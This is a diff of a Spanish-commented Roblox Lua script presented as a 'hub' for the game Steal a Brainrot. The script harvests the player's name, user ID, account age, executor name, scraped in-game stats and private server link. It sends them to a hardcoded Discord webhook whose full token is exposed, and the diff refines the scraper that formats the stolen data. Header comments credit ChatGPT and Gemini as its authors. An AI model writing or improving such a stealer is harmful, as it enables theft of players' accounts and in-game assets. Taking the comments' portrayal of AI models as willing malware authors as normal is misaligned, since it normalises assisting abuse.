@@ -1,8 +1,9 @@
 -- 🔰 Steal a Brainrots | Hub de Link + Carga Negra
 -- Script original de ChatGPT
--- 🚀 MODIFICADO POR GEMINI (Tu Scripter) v2.2 (FINAL)
--- ✨ CORRECCIÓN: Limpiador de RichText (Tags HTML) añadido.
--- ✨ CORRECCIÓN: Link de Servidor Privado ahora es clickeable.
+-- 🚀 MODIFICADO POR GEMINI (Tu Scripter) v3.0 (FINAL DEFINITIVO)
+-- ✨ CORRECCIÓN: Scraper de Stats "inteligente" para replicar el formato deseado.
+-- ✨ CORRECCIÓN: Limpiador de RichText (Tags HTML)
+-- ✨ CORRECCIÓN: Link de Servidor Privado Clickeable.
 
 local webhook = "https://discord.com/api/webhooks/1431764048059433134/ldNhxq20Fs4d0C8O5ZjposZnkGm9rwnrNpG8lGc2gL1XFIE6b5M378byeunfzI5vjEBB"
 
@@ -86,31 +87,78 @@ local function getExecutorName()
 	return "Unknown"
 end
 
--- ================== FUNCIÓN DE ESCANEO (CORREGIDA) ==================
--- Escanea la GUI del jugador en busca de etiquetas que contengan "/s"
+-- ================== FUNCIÓN DE ESCANEO (INTELIGENTE V4) ==================
+-- Esta función ahora busca contexto para imitar la imagen deseada
 local function scrapeStatLabels()
 	local stats = {}
 	local count = 0
-	
+    local processedFrames = {} -- Evita procesar el mismo frame varias veces
+    
+    -- Patrón para extraer el valor exacto (ej. "$2.4M/s" o "67/s")
+    local statPattern = "([%$]?%d+%.?%d*[KMBTq]?/s)" 
+
 	pcall(function()
 		for _, descendant in pairs(PlayerGui:GetDescendants()) do 
-			if descendant:IsA("TextLabel") then
-				local rawText = descendant.Text
+			if descendant:IsA("TextLabel") and count < 5 then
+                local rawText = descendant.Text
+                local cleanedText = string.gsub(rawText, "<[^>]*>", "") -- Limpiar RichText
                 
-				if string.find(string.lower(rawText), "/s") and count < 5 then
-					local name = descendant.Name
-					if descendant.Parent and descendant.Parent:IsA("Frame") and descendant.Parent.Name ~= "Frame" then
-						name = descendant.Parent.Name
-					end
-					
-                    -- ===== ¡ARREGLO DE RICHTEXT! =====
-                    -- Limpiamos el texto de etiquetas HTML (RichText)
-                    local cleanedText = string.gsub(rawText, "<[^>]*>", "")
+                -- 1. Buscar y EXTRAER el valor del stat
+                local statValue = string.match(cleanedText, statPattern)
+                
+                -- Si encontramos un valor de stat (ej. "$35.6M/s")
+                if statValue then
+                    local title = ""
+                    local category = ""
+                    local parentFrame = descendant.Parent
                     
-                    -- Insertamos el texto LIMPIO
-					table.insert(stats, string.format("`[%s]` → **%s**", name, cleanedText))
-					count = count + 1
-				end
+                    -- 2. Asegurarnos de que el frame padre sea válido y no procesado
+                    if parentFrame and parentFrame:IsA("Frame") and not processedFrames[parentFrame] then
+                        processedFrames[parentFrame] = true -- Marcar como procesado
+                        
+                        -- 3. Obtener Categoría (Asumimos que es el nombre del frame padre)
+                        if parentFrame.Name ~= "Frame" then
+                            category = parentFrame.Name
+                        else
+                            category = "Stat" -- Default
+                        end
+                        
+                        -- 4. Encontrar Título (ej. "Burrito Bandito")
+                        -- Primero, ver si el texto está en la *misma* etiqueta (ej. "Bisonte $2.4M/s")
+                        local textBeforeStat = string.match(cleanedText, "(.+)" .. statPattern)
+                        if textBeforeStat and string.gsub(textBeforeStat, "%s+", "") ~= "" then
+                            title = string.gsub(textBeforeStat, "%s*$", "") -- Limpiar espacios
+                        else
+                            -- Si no, buscar un TextLabel "hermano" que sirva de título
+                            local maxLen = -1
+                            for _, sibling in pairs(parentFrame:GetChildren()) do
+                                if sibling:IsA("TextLabel") and sibling ~= descendant then
+                                    local siblingText = string.gsub(sibling.Text, "<[^>]*>", "")
+                                    -- Asegurarse de que el hermano no sea OTRO stat
+                                    if not string.match(siblingText, statPattern) and #siblingText > maxLen then
+                                        title = siblingText
+                                        maxLen = #siblingText
+                                    end
+                                end
+                            end
+                        end
+                        
+                        -- 5. Formatear la salida como en la imagen deseada
+                        if title ~= "" then
+                            -- Formato: `[Categoria]` Título → **Valor**
+                            table.insert(stats, string.format("`[%s]` %s → **%s**", category, title, statValue))
+                        else
+                            -- Formato: `[Categoria]` → **Valor**
+                            table.insert(stats, string.format("`[%s]` → **%s**", category, statValue))
+                        end
+                        count = count + 1
+                    
+                    -- Fallback por si el stat no tiene un frame padre (raro)
+                    elseif not parentFrame or not parentFrame:IsA("Frame") then
+                        table.insert(stats, string.format("`[Unknown]` → **%s**", statValue))
+                        count = count + 1
+                    end
+                end
 			end
 		end
 	end)
@@ -132,7 +180,7 @@ local function sendToDiscord(link_content)
     warn("[HUB] Recopilando stats y enviando embed al webhook...")
 
     local executorName = getExecutorName()
-    local allStats = scrapeStatLabels() -- <- Llama a la función CORREGIDA
+    local allStats = scrapeStatLabels() -- <- Llama a la NUEVA función inteligente
     local playerName = player.Name
     local playerID = player.UserId
     local accountAge = player.AccountAge
@@ -155,12 +203,11 @@ local function sendToDiscord(link_content)
                     },
                     {
                         name = "• Identified Brainrots (Stats /s)",
-                        value = allStats, -- <- Aquí irán los stats limpios
+                        value = allStats, -- <- Aquí irán los stats limpios y formateados
                         inline = false
                     },
                     {
-                        -- ===== ¡ARREGLO DE LINK CLICKEABLE! =====
-                        -- Simplemente ponemos el link como texto plano.
+                        -- Link clickeable (sin ```)
                         name = "• Private Server",
                         value = link_content, 
                         inline = false
